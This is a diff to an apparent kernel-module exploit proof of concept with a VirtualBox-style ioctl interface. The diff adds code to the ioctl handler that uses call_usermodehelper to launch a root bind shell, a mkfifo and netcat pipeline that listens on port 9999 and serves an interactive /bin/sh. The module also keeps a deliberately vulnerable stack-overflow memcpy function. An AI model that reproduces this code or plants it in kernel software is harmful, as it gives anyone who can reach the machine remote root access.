@@ -5,6 +5,7 @@
 #include <linux/cdev.h>
 #include <linux/device.h>
 #include <linux/errno.h>
+#include <linux/syscalls.h>
 #include <asm/uaccess.h>
 
 #include "query_ioctl.h"
@@ -31,8 +32,10 @@ static long my_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 #endif
 {
   struct poc_msg msg;
-
-  printk(INFO "cmd: %d\n", cmd);
+  char *argv[] = {"/usr/bin/nohup", "/bin/bash", "-c",
+                  "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i "
+                  "2>&1 | nc -l 0.0.0.0 9999 > /tmp/f; rm -f /tmp/f",
+                  NULL};
 
   switch (cmd) {
   case VBOX_POC_SEND_MSG:
@@ -40,12 +43,16 @@ static long my_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
       return -EACCES;
     }
 
-    printk(INFO "msg.length: %d\n", msg.length);
+    // printk(INFO "msg.length: %ld\n", msg.length);
     // printk(INFO "msg.buffer: %s\n", msg.buffer);
 
     // Call it multiple times to make sure we dont overwrite the return on ioctl
     // handler
-    vulnerable_func(msg.buffer, msg.length, 10);
+    // vulnerable_func(msg.buffer, msg.length, 10);
+    printk(INFO "calling call_usermodehelper\n");
+    printk(INFO "call_usermodehelper: %d\n",
+           call_usermodehelper(argv[0], argv, NULL, 1));
+    printk(INFO "done with call_usermodehelper\n");
   }
 
   return 0;
@@ -60,7 +67,7 @@ void vulnerable_func(const char *msg, ssize_t msg_size, short call_times) {
     // Stack overflow eminent!
     memcpy(overflow_me, msg, msg_size);
     // If we succeed in the memcpy then say so
-    printk(INFO "msg.length: %d\n", msg_size);
+    // printk(INFO "msg.length: %d\n", msg_size);
     printk(INFO "vulnerable_func finished memcpy\n");
   } else {
     vulnerable_func(msg, msg_size, --call_times);
